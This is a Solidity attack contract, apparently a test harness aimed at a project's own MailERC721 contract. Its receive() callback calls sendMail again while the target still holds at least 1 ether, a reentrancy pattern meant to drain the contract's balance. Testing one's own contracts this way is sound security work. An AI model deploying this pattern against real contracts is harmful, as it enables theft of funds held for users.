// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

import "../custom/MailERC721.sol";
import "../common/IERC721Receiver.sol";
import "../common/ERC20.sol";

contract MailERC721Attack_1 is IERC721Receiver{
    MailERC721 private _contract;

    constructor(address _mail721Address) {
        _contract = MailERC721(_mail721Address);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external
    override
    pure
    returns(bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    // Receive is called when the contract sends Ether to the attacker contract.
    receive() external payable {
        if (address(_contract).balance >= 1 ether) {
            sendMail();
        }
    }

    function attack() external payable {
        createMailBox();
        sendMail();
    }

    function createMailBox() internal {
        _contract.sendMail(address(this), "mailBoxUri", "mailUri", 0);
    }

    function approve(address creditsAddress) external {
        ERC20 credits = ERC20(creditsAddress);
        credits.approve(address(_contract), 1 ether);
    }

    function sendMail() internal {
        _contract.sendMail{value: 1 ether}(address(this), "mailUri", 0);
    }

    // Helper function to check the balance of this contract
    function getBalance() internal view returns (uint) {
        return address(this).balance;
    }
}
